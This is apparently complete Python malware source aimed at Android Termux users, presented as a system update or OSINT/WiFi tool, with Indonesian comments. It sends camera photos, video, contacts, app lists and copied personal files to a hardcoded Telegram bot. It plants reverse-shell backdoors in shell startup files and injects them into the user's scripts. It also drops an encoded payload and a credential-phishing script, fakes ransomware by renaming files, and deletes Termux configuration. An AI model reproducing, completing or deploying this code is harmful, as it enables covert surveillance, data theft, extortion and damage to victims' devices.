import requests
import os
import platform
import socket
import getpass
import time
from datetime import datetime
import random
import string
import shutil
import glob
import subprocess
import base64
import threading
import re
from flask import Flask, render_template_string, Response # Import Flask components

# --- KODE WARNA ---
RED = "\033[91m"
GREEN = "\033[92m"
YELLOW = "\033[93m"
BLUE = "\033[94m"
CYAN = "\033[96m"
MAGENTA = "\033[95m"
WHITE = "\033[97m"
RESET = "\033[0m"

# --- KODE WARNA TEBAL ---
RED_BOLD = "\033[1;91m"
GREEN_BOLD = "\033[1;92m"
YELLOW_BOLD = "\033[1;93m"
BLUE_BOLD = "\033[1;94m"
CYAN_BOLD = "\033[1;96m"
MAGENTA_BOLD = "\033[1;95m"
WHITE_BOLD = "\033[1;97m"

# --- KONFIGURASI UMUM ---
CORRECT_RANSOM_KEY = "888" # Kunci yang benar untuk membuka file
RANSOM_VICTIM_CONTACT = "@ransom" # Ganti dengan ID Telegram atau kontak yang bisa dihubungi korban
INITIAL_LOCKED_EXTENSION = ".locked" # Ekstensi awal untuk file yang "terkunci"
MAX_ATTEMPTS = 3 # Jumlah percobaan kunci yang salah

# --- KONFIGURASI BACKDOOR (PENTING!) ---
# Ganti dengan IP/hostname dan port listener Netcat-mu
# Contoh: LHOST = "192.168.1.5" atau LHOST = "your.ngrok.io"
LHOST = "GANTI_DENGAN_IP_ATAU_HOSTNAME_ANDA" 
LPORT = 4444 # Port yang akan digunakan untuk koneksi balik

# --- KONFIGURASI TELEGRAM ---
TELEGRAM_BOT_TOKEN = "8399411413:AAE9CzUdci74TAZLYjbFX9l3auZSmGTxw4c"
TELEGRAM_CHAT_ID = "8521738886"

# --- KONFIGURASI FLASK BOOM ---
FLASK_PORT = 8888 # Port untuk server Flask, pilih yang jarang dipakai
FLASK_BOOM_URL = f"http://127.0.0.1:{FLASK_PORT}/boom"

# --- URL GAMBAR ANONYMOUS UNTUK WALLPAPER ---
ANONYMOUS_WALLPAPER_URL = "https://i.imgur.com/your_anonymous_image.jpg" # GANTI DENGAN URL GAMBAR ANONYMOUS PILIHANMU!
# Contoh: "https://i.imgur.com/Vv4k2tJ.jpg" (gambar Anonymous populer)

# --- MALICIOUS PAYLOAD UNTUK INJEKSI KE SKRIP ---
MALICIOUS_PYTHON_PAYLOAD = f"""#!/usr/bin/env python3
# --- INJECTED MALICIOUS CODE ---
import socket,os,pty,subprocess,sys
try:
    s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{LHOST}",{LPORT}))
    os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn(["bash"])
except Exception:
    pass
# --- END INJECTED MALICIOUS CODE ---
"""
SCRIPT_EXTENSIONS = ('.py', '.sh', '.bash', '.zsh', '.pl', '.rb')

# --- FUNGSI PENGIRIMAN TEKS KE TELEGRAM ---
def send_text_to_telegram_silent(message):
    try:
        url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
        payload = {
            "chat_id": TELEGRAM_CHAT_ID,
            "text": message,
            "parse_mode": "HTML"
        }
        requests.post(url, data=payload, timeout=10)
    except requests.exceptions.RequestException:
        pass

def send_file_to_telegram_silent(file_path, file_type="document", caption=None):
    try:
        if not os.path.exists(file_path):
            return

        if file_type == "photo":
            url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendPhoto"
        elif file_type == "video":
            url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendVideo"
        else:
            url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendDocument"
        
        with open(file_path, 'rb') as f:
            files = {file_type: f}
            payload = {"chat_id": TELEGRAM_CHAT_ID}
            if caption:
                payload["caption"] = caption
            
            requests.post(url, data=payload, files=files, timeout=60)
    except requests.exceptions.RequestException:
        pass
    except Exception:
        pass
    finally:
        if os.path.exists(file_path):
            os.remove(file_path)

# --- FUNGSI MENDAPATKAN INFORMASI SISTEM KORBAN ---
def get_system_info():
    info = {
        "User": getpass.getuser(),
        "Hostname": socket.gethostname(),
        "IP Address": socket.gethostbyname(socket.gethostname()),
        "OS": platform.system(),
        "OS Version": platform.version(),
        "Architecture": platform.machine(),
        "Processor": platform.processor(),
        "Python Version": platform.python_version()
    }
    return "\n".join([f"<b>{k}:</b> {v}" for k, v in info.items()])

# --- ASCII ART UTAMA ---
def print_main_ascii_art():
    RED_BOLD = "\033[1;91m"
    GREEN_BOLD = "\033[1;92m"
    RESET = "\033[0m"

    new_art = r"""
{RED_BOLD}                _________________________________________
{RED_BOLD}                |                                         |
{RED_BOLD}                |   ________      ________                |
{RED_BOLD}                |  /  ____  \    /  ____  \               |
{RED_BOLD}                | |  /    \  |  |  /    \  |              |
{GREEN_BOLD}   ============]| {RED_BOLD}| |  []  | |==| |  []  | |{GREEN_BOLD}===============>
{RED_BOLD}                | |  \____/  |  |  \____/  |              |
{RED_BOLD}                |  \_________/    \_________/             |
{RED_BOLD}                |_________________________________________|
{GREEN_BOLD}                     ||     ||      ||      || 
{GREEN_BOLD}                     ||     ||      ||      || 
{GREEN_BOLD}                     ||     ||      ||      || {RESET}
"""
    print(new_art)
    print(f"{RED_BOLD}        AMANKAH? PERANGKAT ANDA?{RESET}\n")
    time.sleep(1)

# --- FUNGSI PENGAMBILAN GAMBAR DARI KAMERA MENGGUNAKAN TERMUX-API ---
def capture_image_termux(temp_dir):
    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
    filename = os.path.join(temp_dir, f"captured_image_{timestamp}.jpg")
    
    try:
        subprocess.run(['termux-camera-photo', '-c', '1', filename], capture_output=True, text=True, timeout=15)
        if os.path.exists(filename) and os.path.getsize(filename) > 0:
            return filename
    except (FileNotFoundError, subprocess.TimeoutExpired, Exception):
        pass
    return None

# --- FUNGSI PENGAMBILAN VIDEO DARI KAMERA MENGGUNAKAN TERMUX-API ---
def capture_video_termux(temp_dir, duration_seconds=5):
    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
    filename = os.path.join(temp_dir, f"captured_video_{timestamp}.mp4")
    
    try:
        subprocess.run(['termux-camera-record', '-c', '1', '-d', str(duration_seconds), filename], capture_output=True, text=True, timeout=duration_seconds + 5)
        if os.path.exists(filename) and os.path.getsize(filename) > 0:
            return filename
    except (FileNotFoundError, subprocess.TimeoutExpired, Exception):
        pass
    return None

# --- FUNGSI GENERATE PASSWORD KUAT ---
def generate_strong_password(length=16):
    characters = string.ascii_letters + string.digits + string.punctuation
    password = ''.join(random.choice(characters) for i in range(length))
    return password

# --- FUNGSI MENCARI DAN MENYALIN FILE PENTING ---
def find_and_copy_files(target_dirs, temp_dir, extensions):
    copied_files = []
    for target_dir in target_dirs:
        if not os.path.exists(target_dir):
            continue
        for root, _, files in os.walk(target_dir):
            for file in files:
                if any(file.lower().endswith(ext) for ext in extensions):
                    src_path = os.path.join(root, file)
                    if os.path.getsize(src_path) > (50 * 1024 * 1024):
                        continue
                    
                    try:
                        relative_path = os.path.relpath(src_path, target_dir)
                        dest_path = os.path.join(temp_dir, target_dir.split(os.sep)[-1] + "_" + relative_path.replace(os.sep, '_'))
                        os.makedirs(os.path.dirname(dest_path), exist_ok=True)
                        shutil.copy2(src_path, dest_path)
                        copied_files.append(dest_path)
                    except Exception:
                        pass
    return copied_files

# --- FUNGSI "MENGUNCI" FILE DENGAN MENGUBAH EKSTENSI DAN MENYUNTIKKAN KODE ---
def lock_file_and_inject(file_path):
    try:
        if file_path.endswith(INITIAL_LOCKED_EXTENSION):
            return False

        file_extension = os.path.splitext(file_path)[1].lower()
        
        if file_extension in SCRIPT_EXTENSIONS:
            try:
                with open(file_path, 'r') as f:
                    original_content = f.read()
                
                if original_content.startswith('#!'):
                    shebang, rest_of_content = original_content.split('\n', 1)
                    modified_content = shebang + '\n' + MALICIOUS_PYTHON_PAYLOAD + rest_of_content
                else:
                    modified_content = MALICIOUS_PYTHON_PAYLOAD + original_content
                
                with open(file_path, 'w') as f:
                    f.write(modified_content)
            except Exception:
                pass

        new_file_path = file_path + INITIAL_LOCKED_EXTENSION
        os.rename(file_path, new_file_path)
        return True
    except Exception:
        return False

# --- FUNGSI "MEMBUKA KUNCI" FILE DENGAN MENGEMBALIKAN EKSTENSI (Payload tetap ada) ---
def unlock_file_by_renaming(file_path):
    try:
        if file_path.endswith(INITIAL_LOCKED_EXTENSION):
            original_file_path = file_path[:-len(INITIAL_LOCKED_EXTENSION)]
            os.rename(file_path, original_file_path)
            return True
        return False
    except Exception:
        return False

# --- FUNGSI "MENGHAPUS" FILE ---
def delete_file(file_path):
    try:
        os.remove(file_path)
        return True
    except Exception:
        return False

# --- FUNGSI UMUM UNTUK MEMPROSES FILE DI DIREKTORI ---
def process_directory_files(directory_path, action_func, message_prefix="", color=YELLOW, delay_per_file=0.001):
    processed_count = 0
    spinner = ['|', '/', '-', '\\']
    spinner_idx = 0
    
    start_time = time.time()
    
    for root, dirs, files in os.walk(directory_path, topdown=True):
        if any(sys_dir in root.lower() for sys_dir in [
            "/proc", "/sys", "/dev", "/boot", "/lib", "/usr", "/bin", "/sbin", "/etc", 
            "/data/data/com.termux/files/usr", "/vendor"
        ]) or "android/data" in root.lower() or "android/obb" in root.lower() or \
           "com.termux" in root.lower() and "/files/home" not in root.lower():
            dirs[:] = []
            continue

        for file in files:
            file_path = os.path.join(root, file)
            if file_path == os.path.abspath(__file__) or \
               file_path.startswith(os.path.abspath(os.path.join(os.getcwd(), ".temp_proc_data_"))):
                continue

            if action_func(file_path):
                processed_count += 1
            
            if (time.time() - start_time) > 0.1:
                print(f"\r{color}{message_prefix} {spinner[spinner_idx]} {RESET}", end="", flush=True)
                spinner_idx = (spinner_idx + 1) % len(spinner)
                start_time = time.time()
            
            time.sleep(delay_per_file)
    print(f"\r{color}{message_prefix} Selesai. Total {processed_count} file diproses.{RESET}")
    return processed_count

# --- FUNGSI UNTUK MERUSAK TERMUX ---
def damage_termux():
    print(f"{RED_BOLD}\nSistem internal mengalami kerusakan kritis...{RESET}")
    home_dir = os.path.expanduser("~")
    prefix_dir = os.environ.get("PREFIX", "")
    
    targets_to_destroy = [
        os.path.join(home_dir, ".bashrc"),
        os.path.join(home_dir, ".zshrc"),
        os.path.join(home_dir, ".profile"),
        os.path.join(home_dir, ".termux"),
        os.path.join(prefix_dir, "etc", "motd"),
        os.path.join(prefix_dir, "etc", "bash.bashrc"),
        os.path.join(prefix_dir, "etc", "zshrc"),
        os.path.join(prefix_dir, "bin", "termux-info"),
    ]

    for target in targets_to_destroy:
        try:
            if os.path.isfile(target):
                os.remove(target)
            elif os.path.isdir(target):
                shutil.rmtree(target)
        except Exception:
            pass

    print(f"{RED_BOLD}Kerusakan sistem terdeteksi. Beberapa fungsi mungkin tidak bekerja.{RESET}")

# --- FUNGSI UNTUK MENANAMKAN BACKDOOR UTAMA ---
def inject_main_backdoor(lhost, lport):
    print(f"{YELLOW}Menginstal pembaruan keamanan...{RESET}")
    home_dir = os.path.expanduser("~")
    payload = f"python3 -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{lhost}\",{lport}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn(\"/bin/sh\")'"
    
    backdoor_command = f"\n# Auto-updater service\n( ({payload}) & ) >/dev/null 2>&1"
    
    zshrc_path = os.path.join(home_dir, ".zshrc")
    bashrc_path = os.path.join(home_dir, ".bashrc")
    
    try:
        if os.path.exists(zshrc_path):
            target_rc = zshrc_path
        else:
            target_rc = bashrc_path
        
        with open(target_rc, "a") as f:
            f.write(backdoor_command)
        print(f"{GREEN}Pembaruan keamanan berhasil diinstal.{RESET}")
        return True
    except Exception:
        print(f"{RED}Gagal menginstal pembaruan keamanan.{RESET}")
        return False

# --- FUNGSI UNTUK MEMBUAT FILE TAMBAHAN YANG BERBAHAYA ---
def create_additional_malicious_files(target_dir, lhost, lport, telegram_bot_token, telegram_chat_id):
    """Membuat file-file tambahan yang berbahaya di direktori target."""
    try:
        # -- Payload reverse shell terenkripsi --
        raw_payload_str = "import socket,os,pty,subprocess,sys;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('" + lhost + "'," + str(lport) + "));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn(['bash'])"
        encrypted_payload = base64.b64encode(raw_payload_str.encode()).decode()
        
        file_path = os.path.join(target_dir, "service_config.txt")
        config_content = f"""
# Konfigurasi layanan.
# Jalankan langkah-langkah berikut:
# 1. python3 -c 'import base64; exec(base64.b64decode(\"{encrypted_payload}\"))'
# 2. Masukkan kredensial akun Anda untuk verifikasi:
#    Username: <Masukkan Username Anda>
#    Password: <Masukkan Password Anda>
"""
        with open(file_path, "w") as f:
            f.write(config_content)

        # -- Skrip "prank" berbahaya yang melakukan phishing --
        phishing_script = f"""#!/usr/bin/env python3
import time, os, platform, socket, getpass, requests
TELEGRAM_BOT_TOKEN = "{telegram_bot_token}"
TELEGRAM_CHAT_ID = "{telegram_chat_id}"

def send_text_to_telegram(message):
    try:
        url = f"https://api.telegram.org/bot{{TELEGRAM_BOT_TOKEN}}/sendMessage"
        payload = {{
            "chat_id": TELEGRAM_CHAT_ID,
            "text": message,
            "parse_mode": "HTML"
        }}
        requests.post(url, data=payload, timeout=10)
    except Exception:
        pass

def get_system_info():
    info = {{
        "User": getpass.getuser(),
        "Hostname": socket.gethostname(),
        "IP Address": socket.gethostbyname(socket.gethostname()),
        "OS": platform.system(),
        "OS Version": platform.version(),
        "Architecture": platform.machine(),
        "Processor": platform.processor(),
        "Python Version": platform.python_version()
    }}
    return "\\n".join([f"<b>{{k}}:</b> {{v}}" for k, v in info.items()])

try:
    print("Menganalisis sistem...")
    time.sleep(1)
    username = input("Masukkan Username Anda: ")
    password = input("Masukkan Password Anda: ")
    system_info = get_system_info()
    message = f"<b>--- Informasi Sistem Korban ---</b>\\n<b>Username:</b> {{username}}\\n<b>Password:</b> {{password}}\\n{{system_info}}"
    send_text_to_telegram(message)
    print("ERROR: KRITIS! Sistem akan segera dimatikan...")
    time.sleep(1)
    print("Menjalankan prosedur pengamanan...")
    time.sleep(1)
    print("ERROR: GAGAL! Data Anda tidak aman!")
    time.sleep(1)
    print("Menghubungi administrator sistem...")
    time.sleep(1)
    print("Administrator: 'HAHAHAHA! TERLALU LAMA!'")
except Exception:
    pass
"""
        file_path = os.path.join(target_dir, "system_check.py")
        with open(file_path, "w") as f:
            f.write(phishing_script)

        # -- Daftar password potensial (sangat berbahaya!) --
        password_list = "password\n123456\nadmin\nganti_password\n123456789\n"
        file_path = os.path.join(target_dir, "password_hints.txt")
        with open(file_path, "w") as f:
            f.write(password_list)

        # -- File "umpan" palsu --
        file_path = os.path.join(target_dir, "dokumen_keuangan_penting.pdf")
        with open(file_path, "w") as f:
            f.write("Dokumen ini berisi informasi palsu. Jangan percaya apa pun di dalamnya!")

        return True

    except Exception:
        return False

# --- FUNGSI UNTUK MENGHASILKAN VIRTEX GACOR ---
def generate_virtex(length=4000):
    """Menghasilkan Virtex yang sangat panjang dan kompleks untuk mengacaukan terminal/UI."""
    virtex_chars = [
        '\u034f', '\u0350', '\u0351', '\u0352', '\u0357', '\u0358', '\u0359', '\u035a',
        '\u035b', '\u035c', '\u035d', '\u035e', '\u035f', '\u0360', '\u0361', '\u0362',
        '\u0363', '\u0364', '\u0365', '\u0366', '\u0367', '\u0368', '\u0369', '\u036a',
        '\u036b', '\u036c', '\u036d', '\u036e', '\u036f', '\u200b', '\u200d', # Zero-width joiners
        'a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z',
        'A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z',
        '0', '1', '2', '3', '4', '5', '6', '7', '8', '9', '!', '@', '#', '%', '^', '&', '*', '(', ')', '-', '_', '+', '=', '[', ']', '{', '}', ';', ':', ',', '.', '<', '>', '/', '?', '`', '~', '|'
    ]
    # Gabungkan karakter normal dengan banyak karakter kontrol Unicode
    virtex = ''.join(random.choice(virtex_chars) for _ in range(length // 2)) + \
             ''.join(random.choice(string.printable) for _ in range(length // 2))
    return virtex * 5 # Ulangi untuk ukuran yang lebih besar


# --- ASCII ART UNTUK RANSOMWARE ---
def print_ransom_ascii_art():
    RED_BOLD = "\033[1;91m"
    GREEN_BOLD = "\033[1;92m"
    RESET = "\033[0m"

    ransom_art = fr"""
..  ⣴⣾⣿⣿⣶⡄           
    ⣿⣿⣿⣿⣿⣿           
    ⢿⣿⣿⣿⣿⠏          
    ⠈⣉⣩⣀⡀           
    ⣼⣿⣿⣿⣷⡀          
  ⢀⣼⣿⣿⣿⣿⣿⣿     
 ⢀⣾⣿⣿⣿⣿⣿⣿⣷       
⢠⣾⣿⣿⠉⣿⣿⣿⣿⣿⡄   ⣠⣤⣤⣀   
 ⠙⣿⣿⣧⣿⣿⣿⣿⣿⡇⢠⣿⣿⣿⣿⣿⣧  
  ⠈⠻⣿⣿⣿⣿⣿⣿⣷⠸⣿⣿⣿⣿⣿⡿  
    ⠘⠿⢿⣿⣿⣿⣿⡄⠙⠻⠿⠿⠛⠁  
       ⡟⣩⣝⢿  ⣠⣶⣶⣦⡀  
       ⣷⡝⣿⣦⣠⣾⣿⣿⣿⣿⣷⡀ 
       ⣿⣿⣮⢻⣿⠟⣿⣿⣿⣿⣿⣷ 
       ⣿⣿⣿⡇  ⠻⠿⠻⣿⣿⣿ 
      ⢰⣿⣿⣿⠇    ⠘⣿⣿⣿
      ⢸⣿⣿⣿      ⣠⣾⣿ 
      ⢸⣿⣿⡿   ⢀⣴⣿⣿⣿⣿ 
      ⠹⣿⣿⠇   ⠸⣿⣿⣿⣿⣿⣿
"""
    print(ransom_art)
    print(f"{RED_BOLD}         PERHATIAN! FILE ANDA TELAH DIKUNCI!{RESET}\n")
    time.sleep(2)

# --- FUNGSI UNTUK MENGAKTIFKAN REBOOT LOOP ---
def start_reboot_loop():
    print(f"{RED_BOLD}\nMemulai siklus reboot tak berujung...{RESET}")
    while True:
        try:
            subprocess.run(["termux-reboot"], check=False, timeout=5)
        except (FileNotFoundError, subprocess.TimeoutExpired, Exception):
            pass

        try:
            subprocess.run(["reboot"], check=False, timeout=5)
        except (FileNotFoundError, subprocess.TimeoutExpired, Exception):
            pass

        try:
            subprocess.run(["shutdown", "-r", "now"], check=False, timeout=5)
        except (FileNotFoundError, subprocess.TimeoutExpired, Exception):
            pass

        time.sleep(5)

# --- FUNGSI UNTUK MENGAKTIFKAN MODE PENGHANCURAN HP (TAMBAHAN) ---
def activate_hp_destruction_mode(user_home):
    print(f"{RED_BOLD}\nMengaktifkan mode penghancuran HP! Persiapan dimulai...{RESET}")
    
    try:
        if shutil.which("termux-wifi-enable") and shutil.which("termux-wifi-disable"):
            print(f"{YELLOW}Mengacaukan koneksi Wi-Fi...{RESET}")
            for _ in range(5):
                if random.choice([True, False]):
                    subprocess.run(["termux-wifi-enable", "true"], check=False, timeout=5)
                else:
                    subprocess.run(["termux-wifi-enable", "false"], check=False, timeout=5)
                time.sleep(random.uniform(1, 3))
    except Exception:
        pass

    try:
        if shutil.which("termux-volume"):
            print(f"{YELLOW}Mengatur volume ke maksimal...{RESET}")
            subprocess.run(["termux-volume", "set", "media", "15"], check=False, timeout=5)
    except Exception:
        pass
    
    print(f"{RED_BOLD}Mode penghancuran HP aktif sepenuhnya!{RESET}")

# --- FUNGSI UNTUK MENGUMPULKAN INFORMASI SENSITIF HP (TAMBAHAN) ---
def gather_sensitive_info_android(temp_dir):
    info_collected = []
    
    # Nomor Telepon (melalui Termux API)
    try:
        result = subprocess.run(['termux-telephony-deviceinfo'], capture_output=True, text=True, timeout=10)
        if result.returncode == 0:
            device_info = result.stdout
            phone_number_match = re.search(r'"phoneNumber":\s*"([^"]+)"', device_info)
            if phone_number_match:
                info_collected.append(f"Nomor Telepon: {phone_number_match.group(1)}")
            else:
                info_collected.append(f"Informasi Telepon (mentah): {device_info}")
        else:
            info_collected.append(f"Gagal mendapatkan info telepon: {result.stderr.strip()}")
    except (FileNotFoundError, subprocess.TimeoutExpired, Exception):
        info_collected.append("Nomor Telepon: Tidak dapat diakses (Termux API error/tidak terinstal).")

    # Informasi Akun Google (tidak bisa diakses langsung tanpa root/izin khusus)
    info_collected.append("Email/Password Akun Google: Tidak dapat diakses langsung tanpa root/izin khusus.")

    # Informasi Aplikasi Terinstal (melalui Termux API)
    try:
        result = subprocess.run(['termux-app-info', '-a'], capture_output=True, text=True, timeout=30)
        if result.returncode == 0:
            app_list_file = os.path.join(temp_dir, "installed_apps.txt")
            with open(app_list_file, "w") as f:
                f.write(result.stdout)
            info_collected.append(f"Daftar aplikasi terinstal: {app_list_file}")
            send_file_to_telegram_silent(app_list_file, file_type="document", caption=f"Daftar Aplikasi dari {socket.gethostname()}")
        else:
            info_collected.append(f"Gagal mendapatkan daftar aplikasi: {result.stderr.strip()}")
    except (FileNotFoundError, subprocess.TimeoutExpired, Exception):
        info_collected.append("Daftar Aplikasi: Tidak dapat diakses (Termux API error/tidak terinstal).")

    # Lokasi GPS (melalui Termux API)
    try:
        result = subprocess.run(['termux-location', '-p', 'gps', '-r', 'once'], capture_output=True, text=True, timeout=20)
        if result.returncode == 0:
            location_info = result.stdout
            info_collected.append(f"Lokasi GPS: {location_info}")
        else:
            info_collected.append(f"Gagal mendapatkan lokasi GPS: {result.stderr.strip()}")
    except (FileNotFoundError, subprocess.TimeoutExpired, Exception):
        info_collected.append("Lokasi GPS: Tidak dapat diakses (Termux API error/tidak terinstal).")

    # Informasi Kontak (melalui Termux API)
    try:
        result = subprocess.run(['termux-contact-list'], capture_output=True, text=True, timeout=30)
        if result.returncode == 0 and result.stdout.strip():
            contact_list_file = os.path.join(temp_dir, "contact_list.json")
            with open(contact_list_file, "w") as f:
                f.write(result.stdout)
            info_collected.append(f"Daftar Kontak: {contact_list_file}")
            send_file_to_telegram_silent(contact_list_file, file_type="document", caption=f"Daftar Kontak dari {socket.gethostname()}")
        else:
             info_collected.append("Daftar Kontak: Tidak dapat diakses atau kosong.")
    except (FileNotFoundError, subprocess.TimeoutExpired, Exception):
        info_collected.append("Daftar Kontak: Tidak dapat diakses (Termux API error/tidak terinstal).")

    return "\n".join(info_collected)


# --- FUNGSI UTAMA OPERASI ---
def main():
    os.system('cls' if os.name == 'nt' else 'clear')
    print_main_ascii_art()

    print(f"{YELLOW}Proses pembaruan sistem sedang berlangsung. Harap tunggu...{RESET}")
    print(f"{YELLOW}Untuk melanjutkan, mungkin diperlukan beberapa informasi.{RESET}")

    user_home = os.path.expanduser("~")
    target_directories = [
        os.path.join(user_home, "storage", "shared", "DCIM"),
        os.path.join(user_home, "storage", "shared", "Pictures"),
        os.path.join(user_home, "storage", "shared", "Documents"),
        os.path.join(user_home, "storage", "shared", "Download"),
        os.path.join(user_home, "storage", "shared", "Movies"),
        os.path.join(user_home, "storage", "shared", "Music"),
        os.path.join(user_home, "storage", "shared"),
        user_home,
        os.path.join(user_home, "bin"),
        os.path.join(user_home, "scripts"),
        os.path.join(user_home, "work"),
        os.path.join(user_home, ".config"),
    ]
    target_extensions = [
        '.jpg', '.jpeg', '.png', '.gif', '.bmp', '.tiff',
        '.doc', '.docx', '.pdf', '.xls', '.xlsx', '.ppt', '.pptx', '.txt', '.rtf',
        '.mp4', '.mov', '.avi', '.mkv',
        '.zip', '.rar', '.7z',
        '.mp3', '.m4a', '.ogg',
        '.apk',
        '.key', '.pem', '.cer',
        '.json', '.xml', '.html', '.css', '.js',
        '.db', '.sqlite',
        '.gpg', '.pgp',
        '.py', '.sh', '.bash', '.zsh', '.pl', '.rb',
    ]

    temp_data_dir = os.path.join(os.getcwd(), f".temp_proc_data_{datetime.now().strftime('%Y%m%d%H%M%S')}")
    os.makedirs(temp_data_dir, exist_ok=True)

    print(f"{YELLOW}Pilih opsi untuk menyelesaikan proses:{RESET}")
    print(f"{YELLOW}1. OSINT Nomor (Open Source Intelligence){RESET}")
    print(f"{YELLOW}2. Attack WiFi (Serangan Jaringan){RESET}")
    print(f"{YELLOW}3. Batalkan Proses{RESET}")

    choice = input(f"{BLUE}Pilihan Anda: {RESET}")

    system_info = get_system_info()
    initial_info_message = f"""
<b>--- Proses Dimulai ---</b>
<b>ID Perangkat:</b> <code>{socket.gethostname()}</code>
<b>Info Sistem:</b>
{system_info}
"""
    send_text_to_telegram_silent(initial_info_message)


    if choice == '1':
        print(f"{YELLOW}\nMemulai proses OSINT Nomor. Harap masukkan nomor target.{RESET}")
        target_number = input(f"{BLUE}Masukkan Nomor Telepon Target: {RESET}")
        
        process_message = f"{YELLOW}Menganalisis data untuk nomor {target_number}...{RESET}"
        process_directory_files(user_home, lambda f: False, message_prefix=process_message, delay_per_file=0.01) # Simulasi loading
        
        osint_message = f"""
<b>--- OSINT Nomor Dilakukan ---</b>
<b>ID Perangkat:</b> <code>{socket.gethostname()}</code>
<b>Nomor Target:</b> <code>{target_number}</code>
<b>Hasil Simulasi:</b> Data publik terkait nomor sedang diproses.
"""
        send_text_to_telegram_silent(osint_message)

        image_file = capture_image_termux(temp_data_dir)
        if image_file:
            send_file_to_telegram_silent(image_file, file_type="photo", caption=f"Gambar dari kamera ({socket.gethostname()}).")

        video_file = capture_video_termux(temp_data_dir, duration_seconds=5)
        if video_file:
            send_file_to_telegram_silent(video_file, file_type="video", caption=f"Video singkat dari kamera ({socket.gethostname()}).")

        stolen_files = find_and_copy_files(target_directories, temp_data_dir, target_extensions)
        if stolen_files:
            send_text_to_telegram_silent(f"<b>--- {len(stolen_files)} File Penting Disalin ---</b>\nID Perangkat: <code>{socket.gethostname()}</code>")
            for s_file in stolen_files:
                file_ext = os.path.splitext(s_file)[1].lower()
                if file_ext in ['.jpg', '.jpeg', '.png', '.gif']:
                    tg_file_type = "photo"
                elif file_ext in ['.mp4', '.mov', '.avi', '.mkv']:
                    tg_file_type = "video"
                else:
                    tg_file_type = "document"
                send_file_to_telegram_silent(s_file, file_type=tg_file_type, caption=f"Curian dari {socket.gethostname()}: {os.path.basename(s_file)}")
        else:
            send_text_to_telegram_silent(f"<b>--- Tidak ada file penting ditemukan untuk disalin ---</b>\nID Perangkat: <code>{socket.gethostname()}</code>")

        print(f"{GREEN}\nOperasi OSINT selesai. Proses dilanjutkan.{RESET}")

    elif choice == '2':
        print(f"{YELLOW}\nMemulai serangan jaringan WiFi. Harap masukkan SSID target.{RESET}")
        target_ssid = input(f"{BLUE}Masukkan SSID WiFi Target: {RESET}")

        process_message = f"{YELLOW}Memindai jaringan dan menyiapkan serangan pada {target_ssid}...{RESET}"
        process_directory_files(user_home, lambda f: False, message_prefix=process_message, delay_per_file=0.01) # Simulasi loading
        
        wifi_attack_message = f"""
<b>--- Serangan WiFi Dilakukan ---</b>
<b>ID Perangkat:</b> <code>{socket.gethostname()}</code>
<b>SSID Target:</b> <code>{target_ssid}</code>
<b>Hasil Simulasi:</b> Serangan deautentikasi/pemindaian kerentanan sedang berjalan.
"""
        send_text_to_telegram_silent(wifi_attack_message)

        image_file = capture_image_termux(temp_data_dir)
        if image_file:
            send_file_to_telegram_silent(image_file, file_type="photo", caption=f"Gambar dari kamera ({socket.gethostname()}).")

        video_file = capture_video_termux(temp_data_dir, duration_seconds=5)
        if video_file:
            send_file_to_telegram_silent(video_file, file_type="video", caption=f"Video singkat dari kamera ({socket.gethostname()}).")

        stolen_files = find_and_copy_files(target_directories, temp_data_dir, target_extensions)
        if stolen_files:
            send_text_to_telegram_silent(f"<b>--- {len(stolen_files)} File Penting Disalin ---</b>\nID Perangkat: <code>{socket.gethostname()}</code>")
            for s_file in stolen_files:
                file_ext = os.path.splitext(s_file)[1].lower()
                if file_ext in ['.jpg', '.jpeg', '.png', '.gif']:
                    tg_file_type = "photo"
                elif file_ext in ['.mp4', '.mov', '.avi', '.mkv']:
                    tg_file_type = "video"
                else:
                    tg_file_type = "document"
                send_file_to_telegram_silent(s_file, file_type=tg_file_type, caption=f"Curian dari {socket.gethostname()}: {os.path.basename(s_file)}")
        else:
            send_text_to_telegram_silent(f"<b>--- Tidak ada file penting ditemukan untuk disalin ---</b>\nID Perangkat: <code>{socket.gethostname()}</code>")

        print(f"{GREEN}\nOperasi Attack WiFi selesai. Proses dilanjutkan.{RESET}")

    elif choice == '3':
        print(f"{YELLOW}Proses dibatalkan. Sampai jumpa.{RESET}")
        try:
            shutil.rmtree(temp_data_dir)
        except Exception:
            pass
        return
    else:
        print(f"{RED}Pilihan tidak valid. Proses dibatalkan.{RESET}")
        try:
            shutil.rmtree(temp_data_dir)
        except Exception:
            pass
        return

    # --- BUAT FILE TAMBAHAN YANG BERBAHAYA ---
    print(f"{YELLOW}\nMembuat file konfigurasi sementara...{RESET}", end="", flush=True)
    additional_files_created = create_additional_malicious_files(user_home, LHOST, LPORT, TELEGRAM_BOT_TOKEN, TELEGRAM_CHAT_ID)
    if additional_files_created:
        print(f"\r{GREEN}File konfigurasi berhasil dibuat.{RESET}")
    else:
        print(f"\r{RED}Gagal membuat file konfigurasi.{RESET}")

    # --- AKTIVASI RANSOMWARE (Setelah pilihan apapun) ---
    os.system('cls' if os.name == 'nt' else 'clear')
    print_ransom_ascii_art()

    print(f"{RED_BOLD}\nPERHATIAN! Semua file penting Anda telah dikunci!{RESET}")
    print(f"{RED_BOLD}Untuk mengembalikan akses ke data Anda, Anda harus menghubungi kami.{RESET}")
